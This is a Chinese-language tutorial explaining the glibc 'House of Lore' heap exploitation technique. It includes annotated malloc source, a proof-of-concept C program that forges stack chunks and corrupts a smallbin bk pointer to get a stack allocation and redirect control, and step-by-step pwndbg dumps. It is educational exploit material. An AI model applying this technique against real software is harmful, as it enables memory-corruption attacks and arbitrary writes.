> 附件：
>
> 链接: [https://pan.baidu.com/s/1FhFeWLk5uEmXLhvpu4wkQQ](https://pan.baidu.com/s/1FhFeWLk5uEmXLhvpu4wkQQ)  密码: 30ia
>
> --来自百度网盘超级会员V3的分享
>

# 攻击前提
> house of lore存在于<glibc 2.31版本
>

# ![](https://cdn.nlark.com/yuque/0/2021/png/574026/1614162239705-83c1ef54-675c-4345-94c0-a0c1363a03ee.png)
当处于上图情况时并且可以修改smallbin中的bk指针指向目标地址，malloc**两次**与victim**<font style="color:#F5222D;">大小</font>****<font style="color:#F5222D;">相同</font>**的chunk即可控制该地址。

# 讲解
在上一小节中我们提到了fastbin的内存整理，其机制与malloc_consolidate紧密相关，这一小节来看House of Lore，再来贴一下glibc-2.23环境中malloc时smallbin的执行流程：

```c
#malloc.c中第3405-3434行
  if (in_smallbin_range (nb)) //nb为所申请的chunk的真实大小。
    {//若申请的chunk大小在smallbin中
      idx = smallbin_index (nb);//获取smallbin的索引
      bin = bin_at (av, idx); //获取smallbin中的chunk指针

      if ((victim = last (bin)) != bin)
        {// 先执行 victim= last(bin)，获取 small bin 的最后一个 chunk
         // 如果 victim = bin ，那说明该 bin 为空。
         // 如果不相等，那么会有两种情况
          
          if (victim == 0) /* initialization check */ //第一种情况，smallbin还没有初始化。
            
              malloc_consolidate (av);  //执行初始化，fastbin中的chunk进行合并
          else //第二种情况，smallbin中存在空闲的 chunk
            {
              bck = victim->bk; //获取 small bin 中倒数第二个 chunk 。
	if (__glibc_unlikely (bck->fd != victim)) // 检查 bck->fd 是不是 victim，防止伪造
                {
                  errstr = "malloc(): smallbin double linked list corrupted";
                  goto errout;
                }
              set_inuse_bit_at_offset (victim, nb); // 设置 victim 对应的 inuse 位
              bin->bk = bck; //修改 smallbin 链表，将 small bin 的最后一个 chunk 取出来
              bck->fd = bin;

              if (av != &main_arena)// 如果不是 main_arena，设置对应的标志
                victim->size |= NON_MAIN_ARENA;
              check_malloced_chunk (av, victim, nb);// 细致的检查
              void *p = chunk2mem (victim);// 将申请到的 chunk 转化为对应的 mem 状态
              alloc_perturb (p, bytes);// 如果设置了 perturb_type , 则将获取到的chunk初始化为 perturb_type ^ 0xff
              return p;
            }
        }
    }
  else //若申请的大小不在smallbin中
    {
      idx = largebin_index (nb); //获取largebin中的索引
      if (have_fastchunks (av))	 //判断是否有fastbin chunk
        malloc_consolidate (av);  //整理fastbin
    }
```

看一下针对smallbin的操作：

```c
            bck = victim->bk; //获取 small bin 中倒数第二个 chunk 。
	if (__glibc_unlikely (bck->fd != victim)) // 检查 bck->fd 是不是 victim，防止伪造
                {
                  errstr = "malloc(): smallbin double linked list corrupted";
                  goto errout;
                }
              set_inuse_bit_at_offset (victim, nb); // 设置 victim 对应的 inuse 位
              bin->bk = bck; //修改 smallbin 链表，将 small bin 的最后一个 chunk 取出来
              bck->fd = bin;
```

要执行到这一步需要满足两个条件：

+ 所申请的chunk大小要在smallbin的范围内
+ smallbin中存在空闲的chunk

为了方便说明这个过程，我们直接来看一下house of lore的一个例子：

> 源代码由@yichen师傅翻译：[https://www.yuque.com/hxfqg9/bin/prkw8a](https://www.yuque.com/hxfqg9/bin/prkw8a)
>

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

void jackpot(){ fprintf(stderr, "Nice jump d00d\n"); exit(0); }

int main(int argc, char * argv[]){

  intptr_t* stack_buffer_1[4] = {0};
  intptr_t* stack_buffer_2[3] = {0};
  fprintf(stderr, "定义了两个数组");
  fprintf(stderr, "stack_buffer_1 在 %p\n", (void*)stack_buffer_1);
  fprintf(stderr, "stack_buffer_2 在 %p\n", (void*)stack_buffer_2);

  intptr_t *victim = malloc(100);
  fprintf(stderr, "申请第一块属于 fastbin 的 chunk 在 %p\n", victim);
  intptr_t *victim_chunk = victim-2;//chunk 开始的位置

  fprintf(stderr, "在栈上伪造一块 fake chunk\n");
  fprintf(stderr, "设置 fd 指针指向 victim chunk，来绕过 small bin 的检查，这样的话就能把堆栈地址放在到 small bin 的列表上\n");
  stack_buffer_1[0] = 0;
  stack_buffer_1[1] = 0;
  stack_buffer_1[2] = victim_chunk;

  fprintf(stderr, "设置 stack_buffer_1 的 bk 指针指向 stack_buffer_2，设置 stack_buffer_2 的 fd 指针指向 stack_buffer_1 来绕过最后一个 malloc 中 small bin corrupted, 返回指向栈上假块的指针");
  stack_buffer_1[3] = (intptr_t*)stack_buffer_2;
  stack_buffer_2[2] = (intptr_t*)stack_buffer_1;

  void *p5 = malloc(1000);
  fprintf(stderr, "另外再分配一块，避免与 top chunk 合并 %p\n", p5);

  fprintf(stderr, "Free victim chunk %p, 他会被插入到 fastbin 中\n", victim);
  free((void*)victim);

  fprintf(stderr, "\n此时 victim chunk 的 fd、bk 为零\n");
  fprintf(stderr, "victim->fd: %p\n", (void *)victim[0]);
  fprintf(stderr, "victim->bk: %p\n\n", (void *)victim[1]);

  fprintf(stderr, "这时候去申请一个 chunk，触发 fastbin 的合并使得 victim 进去 unsortedbin 中处理，最终被整理到 small bin 中 %p\n", victim);
  void *p2 = malloc(1200);

  fprintf(stderr, "现在 victim chunk 的 fd 和 bk 更新为 unsorted bin 的地址\n");
  fprintf(stderr, "victim->fd: %p\n", (void *)victim[0]);
  fprintf(stderr, "victim->bk: %p\n\n", (void *)victim[1]);

  fprintf(stderr, "现在模拟一个可以覆盖 victim 的 bk 指针的漏洞，让他的 bk 指针指向栈上\n");
  victim[1] = (intptr_t)stack_buffer_1;

  fprintf(stderr, "然后申请跟第一个 chunk 大小一样的 chunk\n");
  fprintf(stderr, "他应该会返回 victim chunk 并且它的 bk 为修改掉的 victim 的 bk\n");
  void *p3 = malloc(100);

  fprintf(stderr, "最后 malloc 一次会返回 victim->bk 指向的那里\n");
  char *p4 = malloc(100);
  fprintf(stderr, "p4 = malloc(100)\n");

  fprintf(stderr, "\n在最后一个 malloc 之后，stack_buffer_2 的 fd 指针已更改 %p\n",stack_buffer_2[2]);

  fprintf(stderr, "\np4 在栈上 %p\n", p4);
  intptr_t sc = (intptr_t)jackpot;
  memcpy((p4+40), &sc, 8);
}
```

gcc编译之后，开始动态调试，将断点下在第31行，看一下结果：

```c
pwndbg> x/160gx 0x603000
0x603000:	0x0000000000000000	0x0000000000000071 #malloc(100)
0x603010:	0x0000000000000000	0x0000000000000000
......
0x603070:	0x0000000000000000	0x00000000000003f1 #malloc(1000) 
0x603080:	0x0000000000000000	0x0000000000000000 //avoid merge with top chunk
......
0x603460:	0x0000000000000000	0x0000000000020ba1 #top_chunk
......
0x6034f0:	0x0000000000000000	0x0000000000000000
pwndbg> x/16gx &stack_buffer_2
0x7fffffffe510:	0x0000000000000000	0x0000000000000000 #stack_buffer_2
0x7fffffffe520:	0x00007fffffffe530	0x0000000000400b6d
    			#stack_buffer_1
    			#fd
0x7fffffffe530:	0x0000000000000000	0x0000000000000000 #stack_buffer_1
0x7fffffffe540:	0x0000000000603000	0x00007fffffffe510
    			#malloc(100)		#stack_buffer_2
    			#fd					#bk
0x7fffffffe550:	0x00007fffffffe640	0x907da57e112e3600
0x7fffffffe560:	0x0000000000400b20	0x00007ffff7a2d840
0x7fffffffe570:	0x0000000000000001	0x00007fffffffe648
0x7fffffffe580:	0x00000001f7ffcca0	0x0000000000400722
pwndbg> 
```

首先我们在栈上申请了两个stack_buffer（fake chunk），然后将stack_buffer_2的fd指针修改为&stack_buffer_1，将stack_buffer_1的fd修改为&malloc(100)，将其bk修改为&stack_buffer_2。

在free(victim)之后chunk将会加入到fastbin中：

> victim指的是malloc(100)，在英语中指受害者；牺牲品；可数名词
>

```c
pwndbg> bin
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x603000 ◂— 0x0
0x80: 0x0
unsortedbin
all: 0x0
smallbins
empty
largebins
empty
pwndbg> 
```

此时假若我们申请一个比较大的chunk，将调用malloc_consolidate整理victim到smallbin中：

> 这时候去申请一个chunk，触发fastbin的合并使得victim**<font style="color:#F5222D;">进去unsortedbin中处理</font>**，**<font style="color:#F5222D;">最终被整理到smallbin中</font>**
>

```c
pwndbg> bin
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x0
smallbins
0x70 [corrupted]
FD: 0x603000 —▸ 0x7ffff7dd1bd8 (main_arena+184) ◂— 0x603000
BK: 0x603000 ◂— 0x71 /* 'q' */
largebins
empty
pwndbg> 
```

```c
pwndbg> x/300gx 0x603000
0x603000:	0x0000000000000000	0x0000000000000071 #malloc(100)-smallbin
0x603010:	0x00007ffff7dd1bd8	0x00007ffff7dd1bd8
    		#指向main_arena
......
0x603070:	0x0000000000000070	0x00000000000003f0 #malloc(1000)
0x603080:	0x0000000000000000	0x0000000000000000
......
0x603460:	0x0000000000000000	0x00000000000004c1 #malloc(1200)
0x603470:	0x0000000000000000	0x0000000000000000
......
0x603920:	0x0000000000000000	0x00000000000206e1 #top_chunk
......
0x603950:	0x0000000000000000	0x0000000000000000
pwndbg>
```

假如说现在有个漏洞可以修改victim的bk指针，让bk指向我们伪造的chunk：

```c
pwndbg> x/300gx 0x603000
0x603000:	0x0000000000000000	0x0000000000000071 #malloc(100)-smallbin
0x603010:	0x00007ffff7dd1bd8	0x00007fffffffe530
    		#指向main_arena	   #stack_buffer_1
......
0x603070:	0x0000000000000070	0x00000000000003f0 #malloc(1000)
0x603080:	0x0000000000000000	0x0000000000000000
......
0x603460:	0x0000000000000000	0x00000000000004c1 #malloc(1200)
0x603470:	0x0000000000000000	0x0000000000000000
......
0x603920:	0x0000000000000000	0x00000000000206e1 #top_chunk
......
0x603950:	0x0000000000000000	0x0000000000000000
pwndbg> x/16gx 0x00007fffffffe510
0x7fffffffe510:	0x0000000000000000	0x0000000000000000 #stack_buffer_2
0x7fffffffe520:	0x00007fffffffe530	0x0000000000400b6d
    			#stack_buffer_1
    			#fd
0x7fffffffe530:	0x0000000000000000	0x0000000000000000 #stack_buffer_1
0x7fffffffe540:	0x0000000000603000	0x00007fffffffe510
         		#malloc(100)		#stack_buffer_2
    			#fd					#bk
0x7fffffffe550:	0x00007fffffffe640	0x907da57e112e3600
0x7fffffffe560:	0x0000000000400b20	0x00007ffff7a2d840
0x7fffffffe570:	0x0000000000000001	0x00007fffffffe648
0x7fffffffe580:	0x00000001f7ffcca0	0x0000000000400722
pwndbg> 
```

然后申请一个与victim大小相同的chunk，直接来看一下结果：

```c
pwndbg> bin
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x0
smallbins
0x70 [corrupted]
FD: 0x603000 —▸ 0x7ffff7dd1bd8 (main_arena+184) ◂— 0x603000
BK: 0x7fffffffe530 ◂— 0x0   #changed
largebins
empty
pwndbg> x/300gx 0x603000
0x603000:	0x0000000000000000	0x0000000000000071 #malloc(100)
0x603010:	0x00007ffff7dd1bd8	0x00007fffffffe530
    		#指向main_arena	   #stack_buffer_1
......
0x603070:	0x0000000000000070	0x00000000000003f0 #malloc(1000)
0x603080:	0x0000000000000000	0x0000000000000000
......
0x603460:	0x0000000000000000	0x00000000000004c1 #malloc(1200)
0x603470:	0x0000000000000000	0x0000000000000000
......
0x603920:	0x0000000000000000	0x00000000000206e1 #top_chunk
......
0x603950:	0x0000000000000000	0x0000000000000000
pwndbg> x/16gx stack_buffer_2
0x7fffffffe510:	0x0000000000000000	0x0000000000000000 #stack_buffer_2
0x7fffffffe520:	0x00007fffffffe530	0x0000000000400b6d
        		#stack_buffer_1
    			#fd
0x7fffffffe530:	0x0000000000000000	0x0000000000000000 #stack_buffer_1
0x7fffffffe540:	0x00007ffff7dd1bd8	0x00007fffffffe510 #changed
             	#malloc(100)		#stack_buffer_2
    			#fd	
0x7fffffffe550:	0x00007fffffffe640	0x907da57e112e3600
0x7fffffffe560:	0x0000000000400b20	0x00007ffff7a2d840
0x7fffffffe570:	0x0000000000000001	0x00007fffffffe648
0x7fffffffe580:	0x00000001f7ffcca0	0x0000000000400722
pwndbg> 
```

从上面的内存可以看到，在申请了chunk之后我们伪造的stack_buffer_1的fd指针发生了改变，现在指向了main_arena，同时被释放的victim（smallbin）现在处于malloc状态：

> smallbin：FIFO 先入先出
>

```c
pwndbg> p p3
$1 = (void *) 0x603010
pwndbg> 
```

当再次申请相同大小的chunk时，即可控制stack_buffer_1：

```c
pwndbg> bin
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x0
smallbins
0x70 [corrupted]
FD: 0x603000 —▸ 0x7ffff7dd1bd8 (main_arena+184) ◂— 0x603000
BK: 0x7fffffffe510 ◂— 0x0
largebins
empty
pwndbg> x/16gx stack_buffer_2
0x7fffffffe510:	0x0000000000000000	0x0000000000000000
0x7fffffffe520:	0x00007ffff7dd1bd8	0x0000000000400b6d
0x7fffffffe530:	0x0000000000000000	0x0000000000000000 #malloc
0x7fffffffe540:	0x00007ffff7dd1bd8	0x00007fffffffe510
0x7fffffffe550:	0x00007fffffffe640	0x907da57e112e3600
0x7fffffffe560:	0x0000000000400b20	0x00007ffff7a2d840
0x7fffffffe570:	0x0000000000000001	0x00007fffffffe648
0x7fffffffe580:	0x00000001f7ffcca0	0x0000000000400722
pwndbg> p p4
$2 = 0x7fffffffe540 "\330\033\335\367\377\177"
pwndbg> 
```

# 总结
利用house of lore可以分配任意指定位置的 chunk，从而修改任意地址的内存。（任意地址写）

